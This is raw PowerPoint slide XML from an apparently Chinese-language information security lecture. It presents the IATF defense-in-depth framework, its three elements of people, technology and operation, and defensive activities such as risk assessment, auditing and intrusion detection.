            <a:prstGeom prst="roundRect">
              <a:avLst>
                <a:gd name="adj" fmla="val 16667"/>
              </a:avLst>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="31750">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyObliqueTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="accent2"/>
              </a:extrusionClr>
            </a:sp3d>
            <a:extLst>
              <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                </a14:hiddenFill>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89097" name="Text Box 9"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2653" y="1117"/>
              <a:ext cx="1497" cy="374"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:schemeClr val="tx2"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>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chemeClr val="tx2"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
              <a:flatTx/>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400" b="1" dirty="0"/>
                <a:t>深度防御战略</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89098" name="AutoShape 10"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2426" y="1752"/>
              <a:ext cx="1134" cy="363"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst>
                <a:gd name="adj" fmla="val 16667"/>
              </a:avLst>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:schemeClr val="accent1"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="accent2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="5400000" scaled="1"/>
            </a:gradFill>
            <a:ln w="9525">
              <a:round/>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lang="zh-CN" altLang="en-US" sz="2400">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>人</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89099" name="Text Box 11"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4135" y="1720"/>
              <a:ext cx="1268" cy="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en-US" altLang="zh-CN" dirty="0"/>
                <a:t>            </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                  <a:ea typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>人</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr eaLnBrk="1" hangingPunct="1">
                <a:lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                  <a:ea typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t> 通过  技术</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr eaLnBrk="1" hangingPunct="1">
                <a:lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                  <a:ea typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t> 进行  操作</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89100" name="Rectangle 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1610" y="3022"/>
              <a:ext cx="635" cy="635"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="87B0C3"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="27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87B0C3"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>计算环境</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89101" name="Rectangle 13"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2290" y="3022"/>
              <a:ext cx="635" cy="635"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="87B0C3"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="27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87B0C3"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>区域边界</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89102" name="Rectangle 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3016" y="3022"/>
              <a:ext cx="635" cy="635"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="87B0C3"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="27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87B0C3"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>网络</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>基础设施</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89103" name="Rectangle 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3696" y="2886"/>
              <a:ext cx="1452" cy="771"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="87B0C3"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="27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87B0C3"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>支撑性基础设施</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="en-US" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89104" name="Rectangle 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3742" y="3339"/>
              <a:ext cx="635" cy="227"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="CCFF66"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg1"/>
                </a:gs>
              </a:gsLst>
              <a:path path="rect">
                <a:fillToRect r="100000" b="100000"/>
              </a:path>
            </a:gradFill>
            <a:ln w="9525">
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyObliqueTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:srgbClr val="CCFF66"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
                <a:t>密钥管理</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89105" name="Rectangle 17"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4468" y="3339"/>
              <a:ext cx="635" cy="227"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="CCFF66"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg1"/>
                </a:gs>
              </a:gsLst>
              <a:path path="rect">
                <a:fillToRect r="100000" b="100000"/>
              </a:path>
            </a:gradFill>
            <a:ln w="9525">
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyObliqueTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:srgbClr val="CCFF66"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
                <a:t>检测响应</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89106" name="AutoShape 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2335" y="-25"/>
              <a:ext cx="3265" cy="844"/>
            </a:xfrm>
            <a:prstGeom prst="rightArrow">
              <a:avLst>
                <a:gd name="adj1" fmla="val 50000"/>
                <a:gd name="adj2" fmla="val 96712"/>
              </a:avLst>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="FFFF99"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>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FFFF99"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
                <a:t>成功的组织功能</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89107" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2018" y="754"/>
              <a:ext cx="2857" cy="272"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="CC99FF"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg2"/>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CC99FF"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
                <a:t>信息安全保障（</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
                <a:t>IA</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
                <a:t>）</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89091" name="标题 17"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="699444" y="826134"/>
            <a:ext cx="6220342" cy="393669"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>框架</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1703842293"/>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p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="1222377"/>
            <a:ext cx="8280919" cy="1558551"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>人（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>People</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>信息保障体系的核心，是第一位的要素，同时也是最脆弱的。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>基于这样的认识，安全管理在安全保障体系中愈显重要，包括：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>意识培训、组织管理、技术管理、操作管理</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90115" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251520" y="620688"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的三要素</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539553" y="2893690"/>
            <a:ext cx="4824536" cy="1231106"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>技术（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Technology</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>：</a:t>
            </a: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技术是实现信息保障的重要手段。</a:t>
            </a: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动态的技术体系：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent2"/>
              </a:buClr>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>防护、检测、响应、恢复</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="4269155"/>
            <a:ext cx="7566747" cy="1785104"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>操作（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Operation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>：</a:t>
            </a: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也叫运行，构成安全保障的主动防御体系。</a:t>
            </a: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也是将各方面技术紧密结合在一起的主动的过程，包括：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent2"/>
              </a:buClr>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>风险评估、安全监控、安全审计</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent2"/>
              </a:buClr>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>跟踪告警、入侵检测、响应恢复</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent2"/>
              </a:buClr>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>……</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="组合 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6080956" y="2708920"/>
            <a:ext cx="1368152" cy="1368152"/>
            <a:chOff x="6080956" y="2821340"/>
            <a:chExt cx="1368152" cy="1368152"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="椭圆 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6080956" y="2821340"/>
              <a:ext cx="1368152" cy="136815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68988" y="3075042"/>
              <a:ext cx="864096" cy="895723"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
